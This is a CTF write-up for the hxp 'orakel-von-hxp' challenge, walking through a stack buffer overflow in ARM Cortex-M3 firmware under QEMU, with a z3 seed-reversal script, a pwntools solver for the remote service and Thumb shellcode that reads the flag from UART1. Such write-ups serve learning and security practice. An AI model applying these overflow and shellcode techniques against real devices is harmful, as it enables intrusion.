# orakel-von-hxp

## TL; DR
- Stack buffer overflow in LM3S6965EVB board (ARM Cortex-M3), shellcode to read from UART1

## Challenge Description

> AI took my job and now I feel lost. Good thing I have an oracle to ask what to do, although I can’t make sense of what it says. Hint: The flag is continously input on UART1.

- Category: **pwn**

## Exploitation

### Finding the vulnerability

- The challenge files provided include typical docker setup config files like a compose.yml, Dockerfile, etc. and the `src/` directory. There is a `start.py` script, it is the equivalent to `run.sh` in other kernel CTF challenges. It does a variety of things:
1. Creates the firmware bin to pass to QEMU
2. Randomizes every symbol location to make it less predictable, and impossible to hardcode function addresses.
3. Sets up a process that transmits the flag every 2 seconds into UART1.
4. Starts qemu process setting up 2 serial ports: UART0 for user I/O and UART1 for the flag transmission.

- We can now take a look to `main.c`, this will be the entry point program of the system.

```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "drivers/irq.h"
#include "drivers/nvic.h"
#include "drivers/sysctl.h"
#include "drivers/systick.h"
#include "os/system_time.h"
#include "drivers/uart_drv.h"
#include "os/serial_io.h"
#include "os/task_scheduler.h"
#include "mtwister.h"
#include "os/tinyprintf.h"

/* main() represents the entry point in a c program.
 * In this bare-metal system, main represents the 
 * function where we initialize the various peripherals and 
 * in a way serves as an entry point to the (initialized) system
 */

const char *enlightened = "I am enlightened";

void shitty_putchar(void* p, char c)
{
    serial_putchar_generic(p, c);
}

int main(void)
{
    uint32_t clk_cfg1, clk_cfg2;
    uint32_t buffer[0x20];
    char* sbuf = (char*) buffer;

    /* Let's now re-enable the interrupts*/
    irq_master_enable();

    /* Also, let's also turn on the UART0 interrupt */
    nvic_irq_enable(IRQ_UART0);

    /* Set the system clock to the PLL with the main oscillator as the source
     * with the crystal frequency set to 8 MHz. 
     * Divide the PLL output clock frquency by a factor of 12.
     * Turn off the (unused) internal oscillator. This is to configure a system clock of 16.67 MHz.
     */
    clk_cfg1 = (SYSCTL_PLL_SYSCLK | SYSCTL_RCC_USESYSDIV | SYSCTL_RCC_SYSDIV_11 | 
               SYSCTL_RCC_XTAL_8MHZ | SYSCTL_RCC_OSCSRC_MOSC | SYSCTL_RCC_IOSCDIS);
    clk_cfg2 = 0;

    sysctl_setclk(clk_cfg1, clk_cfg2);
    
    /* Let's set systick period to be 1 milliseconds =>
     * a count of system clock frequency divided by 2.
     */
    systick_set_period_ms(1u);

    /* Let's enable the systick timer and it's interrupt */
    systick_irq_enable();
    systick_enable();

    init_printf((void*)uart0, shitty_putchar);

    /* Configure the uart to a baud-rate of 115200 */
    uart_init(uart0, UART_BAUD_115200);

    serial_puts("Welcome to Orakel von hxp.\n");
    serial_puts("Check out our special offer! Only for a limited time you can ask the oracle as many questions as you like in one sitting.");
    serial_puts("Just utter 'I am enlightened' to quit asking questions.\n");
    serial_puts("\n\n");

    while(1)
    {
        serial_puts("Please ask your question as clearly as possible: ");
        serial_fgets(sbuf, 0x200, uart0);
        if(strncmp(sbuf, enlightened, 16) == 0) break;

        tfp_printf("Your question was %s (0x%x). The oracle is thinking...\n", sbuf, *buffer);
        
        seedRand(*buffer);

        uint32_t *location = (uint32_t*)genRandLong();

        // TODO: what does qemu do if we yolo random memory?
        delay(1000);

        if(uart1->CTL & UARTCTL_UARTEN)
        {
            serial_puts("The oracle is screaming, what have you done?!?");
        }
        else 
        {
            printf("The oracle answered 0x%x.\n", *location);
        }
    }

    serial_puts("Barba non facit philosophum, neque vile gerere pallium.");
    // TODO: automatically kill qemu after this
    
    return 0;
}

```

- There is a clear stack-based buffer overflow vulnerability in the `main` function, where we are reading 0x200 bytes to a buffer with size 0x20.

```c
...
uint32_t buffer[0x20];
char* sbuf = (char*) buffer;
serial_fgets(sbuf, 0x200, uart0);
...
```

- The loop follows the next steps:
    * Asks for an input, and breaks if it matches an specific string `I am enlightened`.
    * Prints our input.
    * Uses the start of the buffer as a seed to generate a random long number.
    * 1000 ms delay
    * Checks if UART1 is enabled, if so, prints a message. If it is not enabled it will print the contents of the random number as an address.

- The randomization algorithm is defined inside mtwister.c file (MT19937 Algorithm for the Mersenne Twister). Looking at it we can see it is possible to reverse it, so knowing an address we can guess the seed needed to generate it. 

### Exploiting the vulnerability

- We know that we want to read from UART1, its address is hardcoded 0x4000d000 for UART1 and 0x4000c000 for UART0. The first thing I tried was guessing the seed needed to generate UART1 address and see what would the program print. I used Gemini to generate a script `brute_seed.py` that used z3 to guess the seed:

```python

from z3 import *

def solve_for_seed(target_output):
    # Standard MT19937 parameters
    N = 624
    M = 397
    
    # 1. Setup the Solver
    s = Solver()
    seed = BitVec('seed', 32)

    # 2. Replicate Seeding Logic (LCG)
    # mt[0] = seed
    # mt[i] = (6069 * mt[i-1]) % 2^32
    mt0_old = seed
    mt1_old = (6069 * mt0_old)
    
    # We need mt[397] for the first twist.
    # mt[397] = seed * (6069^397) mod 2^32
    multiplier_397 = pow(6069, 397, 2**32)
    mt397_old = (multiplier_397 * mt0_old)

    # 3. Replicate the First Twist
    # y = (mt[0] & UPPER) | (mt[1] & LOWER)
    upper_mask = 0x80000000
    lower_mask = 0x7fffffff
    mag1 = 0x9908b0df
    
    y_twist = (mt0_old & upper_mask) | (mt1_old & lower_mask)
    
    # We use LShR (Logical Shift Right) to match C's unsigned shift.
    # We use BitVecVal to ensure the types (Sorts) match for the XOR operation.
    twist_val = LShR(y_twist, 1) ^ If((y_twist & 1) == 1, 
                                     BitVecVal(mag1, 32), 
                                     BitVecVal(0, 32))
    
    # mt[0]_new = mt[397]_old ^ twist_val
    mt0_new = mt397_old ^ twist_val

    # 4. Replicate Tempering
    y = mt0_new
    y ^= LShR(y, 11)
    y ^= (y << 7) & 0x9d2c5680
    y ^= (y << 15) & 0xefc60000
    y ^= LShR(y, 18)

    # 5. Add Constraint and Solve
    s.add(y == BitVecVal(target_output, 32))
    
    print(f"[*] Searching for seed that produces {hex(target_output)}...")
    if s.check() == sat:
        model = s.model()
        res = model[seed].as_long()
        print(f"[*] Success!")
        print(f"[*] Seed (Decimal): {res}")
        print(f"[*] Seed (Hex):     {hex(res)}")
        return res
    else:
        print("[!] No seed found. Check if the output index or constants are correct.")
        return None

if __name__ == "__main__":
    target = 0x4000D000
    solve_for_seed(target)
```

- After some trial and error the script finally worked and generated the seed `0x7ffde650`.

- To start debugging the challenge, I had to set up a few things. First, I commented out a line in `start.py` to disable the function address randomization, this would let me place breakpoints in the correct addresses every time without needing to leak anything. Add `-s` in the qemu parameters to enable a gdbserver remote instance. Fix some other parameters in the docker-compose.yml and remove the proof-of-work checker from my local instance. After starting the docker, we could grab the firmware binary with `docker cp`.

- Now we place a breakpoint at `0x262 <main+178> bl genRandLong` and see the value it returns.

```nasm
pwndbg> x $r0
0x4000d000:	0x0000007b
```

- It worked! And parts of the flag are being printed:

```console
Your question was P\xe6\xfd\x7f
 (0x7ffde650). The oracle is thinking...
The oracle answered 0x61.
```

- At this point I set up a loop that would send the seed over and over and retrieve the flag characters 1 by 1.

```python
#!/usr/bin/python3

from pwn import *
import subprocess
import sys
import time

context.arch = 'thumb'
context.bits = 32
context.endian = 'little'

rem = False
host = "localhost"
port = 1338

if len(sys.argv) > 1:
	if sys.argv[1] == "rem":
		host = "91.98.131.46"
		rem = True

r = remote(host, port)

def pow_solve():
	r.recvuntil(b'unhex("')

	num = r.recvline().split(b'"')[0]

	print(f"[*] Retrieved num: {num}")

	result = subprocess.run(
	    ["./pow-solver", "30", num.decode()], 
	    capture_output=True, 
	    text=True
	)

	if result.returncode == 0:
	    pow_result = result.stdout.strip()
	    print(f"Result: {pow_result}")
	else:
	    print(f"Error: {result.stderr}")
	    sys.exit(1)

	print(f"[+] Sending {pow_result.encode()}")
	r.sendline(pow_result.encode())

if rem:
	pow_solve()

input("wait")
seed = 0x7ffde650
r.recvuntil(b'possible')
r.sendline(p32(seed))

flag = b""
with log.progress('Flag') as prog:
	for i in range(30):
		prog.status(flag.decode())
		r.recvuntil(b'possible')
		r.sendline(p32(seed))
		r.recvuntil(b'answered')
		b = p8(int(r.recvline().rstrip(b'\n').rstrip(b'.').decode(), 16))
		if b != b'\x00':
			flag += b 

print(b"[*] Retrieved: ")


r.interactive()

```

- This approach got us a part of the flag `hxp{at_l3as7_y0u_f0`, but it always crashed at that point. After a lot of trial and error I had to abandon this approach and try something else, because it looked like a time limitation in the remote instance or as AI would state, Buffer Overrun. This wasn't probably the intended path because there is still a clear buffer overflow in the loop, so I switched to that.

- Looking at the memory pages in GDB, I noticed that the stack was executable and the buffer address was inside the stack.

```nasm
pwndbg> x/60wx 0x2000ff58
0x2000ff58:	0x41414141	0x0000000a	0x00000000	0x00000000
0x2000ff68:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff78:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff88:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ff98:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffa8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffb8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffc8:	0x00000000	0x00000000	0x00000000	0x00000000
0x2000ffd8:	0x1b9ccd4d	0x00000000	0x05c00382	0x2000ff58 <-- *buffer
0x2000ffe8:	0x2000fff0	0x00000139	0x20000a0c	0x00001d38
                        ^ This is the return address (notice 0x138 + 0x1)
```

- My idea then was to write a shellcode that reads bytes in a loop from UART1 until it finds a `}` byte. Flood the stack with padding until the buffer address, set it to its original value to prevent errors in a second call, and overwrite the return address with the address of my shellcode + 1. I placed it 0x10 bytes after the start of the buffer, because I noticed it would be less error prone to 2 two different calls, 1 to write the shellcode and overwrite the stack, and the second one to send the string needed to break out of the loop. It is necessary to write the return address wanted +1 to indicate the CPU that we want to execute it Thumb mode, if we don't do this it won't work.

- I had an AI generated shellcode that would do this:

```nasm
    ldr r5, =0x7d
start:
    ldr r0, =0x4000D000  
    ldr r1, [r0]    
    tst r1, #0xFF        
    beq start    

    ldr r2, =0x4000C000  
    str r1, [r2]
    cmp r1, r5
    beq end         
    b start
end:
```

- This _almost_ worked

![alt text](assets/notflag.png)

- It could print the flag but with a lot of repeated bytes. This was happening because we were reading too fast from UART1, and we had to give some time to the socket to feed the next byte into it. I could not manage to get the AI to create a functional shellcode with a delay (prompt skill issues, nothing to be ashamed of), so I ended up learning ARM assembly on the run and coded it myself.

- This code would create a delay by having a loop that substracted 1 to a register until it reached zero, each time we read a byte.

```nasm
    ldr r3, =0x0
    ldr r5, =0x7d
start:
    movw r4, 0xffff
    movt r4, 0x00ff
delay:
    subs r4, 1
    cmp r4, r3
    bne delay
loop:
    ldr r0, =0x4000D000  
    ldr r1, [r0]    
    tst r1, #0xFF        
    beq start    

    ldr r2, =0x4000C000  
    str r1, [r2]
    cmp r1, r5
    beq end         
    b start
end:  
```

- This worked flawlessly

### Getting the flag

![flag](assets/orakel.gif)

### Solvers

1. Seed guesser: [seed.py](assets/seed.py)
2. Final solver: [solver.py](assets/solver.py)
3. First approach: [first.py](assets/first.py)

### Intended approach

- Mine was **not** the intended path for this challenge. According to the author:
  
![alt text](assets/unintended.png)

- Turns out QEMU does not implement MPU in the Cortex-M layer, so shellcoding is always available for this challenge. In fact, this is the method I used to solve the part 2 of this challenge [cassandra-von-hxp](https://github.com/Iokete/writeups/tree/main/pwn/hxp2025/cassandra-von-hxp). 

- The intended path involved guessing the seed to generate the address of a vector table, this would lead to leaking all the function addresses needed to perform ROP to read the flag from UART1.
